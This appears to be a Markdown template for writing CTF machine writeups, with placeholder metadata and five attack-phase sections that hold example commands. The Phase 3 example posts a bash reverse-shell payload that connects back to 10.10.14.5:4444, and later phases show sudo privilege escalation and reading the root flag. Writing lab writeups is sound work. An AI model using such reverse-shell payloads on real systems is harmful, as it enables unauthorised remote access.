---
# ==============================================================================
# AUKA CTF Vault - Official Writeup Markdown Template
# Note: Files prefixed with an underscore (like this _template.md) are ignored by
# the site parser and will NOT appear on the dashboard. Duplicate this file and
# name it without an underscore (e.g. "my-challenge.md") to publish your writeup.
# ==============================================================================

# Challenge / Machine Name
title: "Challenge Title Goes Here"

# CTF Competition, Platform, or Event Name
event: "AUKA CTF 2026"

# Category must be one of: 'Web' | 'Pwn' | 'Crypto' | 'Rev' | 'Forensics' | 'OSINT' | 'Misc'
category: "Web"

# Difficulty must be one of: 'Easy' | 'Medium' | 'Hard' | 'Insane'
difficulty: "Medium"

# Date solved (YYYY-MM-DD)
solvedDate: 2026-10-08

# Keywords & Attack Techniques for filtering
tags: ["auth-bypass", "sqli", "rce", "linux"]

# Visibility flag
isPublic: true

# Author name or handle
author: "AUKA"

# Short 1-2 sentence overview shown on the card preview
summary: "Brief synopsis of the attack vector, key vulnerability exploited, and the path to root."

# Real CTF Flag string (displayed securely in the interactive Spoiler Flag Box)
flag: "AUKA{sample_flag_h4sh_g03s_h3r3}"

# Technical mission target dossier specifications
dossier:
  targetIp: "10.10.11.100"
  os: "Ubuntu 22.04 LTS"
  arch: "x86_64"
  cve: "CVE-2024-XXXX (or CWE identifier)"
  services:
    - "80/TCP (HTTP / Nginx)"
    - "443/TCP (HTTPS)"
    - "22/TCP (SSH OpenSSH 8.9p1)"
---

<!--
================================================================================
HOW THE BODY WORKS:
Each "## Phase X: [Phase Name]" header in this markdown body is automatically
parsed into a step on the interactive MITRE ATT&CK Kill Chain tracker bar!
Use "## " for each major milestone of the attack.
================================================================================
-->

## Phase 1: Reconnaissance & Target Enumeration

Describe your initial port scanning, service discovery, and technology fingerprinting process here.

```bash
# Example nmap command and port scan results:
nmap -sC -sV -p- -T4 --min-rate 1000 10.10.11.100 -oN nmap_initial.txt

# Discovered Services:
# 22/tcp open  ssh  OpenSSH 8.9p1
# 80/tcp open  http Nginx 1.18.0
```

---

## Phase 2: Vulnerability Analysis & Discovery

Explain how you inspected the application or binary, discovered the flaw, and analyzed the root cause (e.g. source code review, decompilation in Ghidra, or inspecting HTTP requests in Burp Suite).

```python
# Optional PoC / analysis helper snippet:
import requests

target = "http://10.10.11.100/api/v1/debug"
response = requests.get(target)
print("[*] Status:", response.status_code)
```

---

## Phase 3: Exploitation & Initial Foothold

Detail the exploitation step that provided remote command execution (RCE) or initial shell access. Include your exploit script or payload.

```python
#!/usr/bin/env python3
# Exploit Script / Reverse Shell Payload
import requests

TARGET_URL = "http://10.10.11.100/vulnerable_endpoint"
PAYLOAD = {
    "command": "bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'"
}

print("[*] Sending payload to target...")
r = requests.post(TARGET_URL, json=PAYLOAD)
print("[+] Response:", r.status_code)
```

---

## Phase 4: Privilege Escalation to Root

Document local enumeration (e.g. `linpeas.sh`, vulnerable SUID binaries, misconfigured sudo permissions, kernel exploits, or credential harvesting) to escalate from a low-privileged user to `root` or `SYSTEM`.

```bash
# Check sudo permissions:
sudo -l

# Elevating privileges:
sudo /usr/bin/vulnerable_binary --execute
id
# uid=0(root) gid=0(root) groups=0(root)
```

---

## Phase 5: Flag Capture & Root Verification

Confirm successful root exploitation and retrieve the final flag.

```bash
# Reading the proof flag:
cat /root/root.txt
# AUKA{sample_flag_h4sh_g03s_h3r3}
```
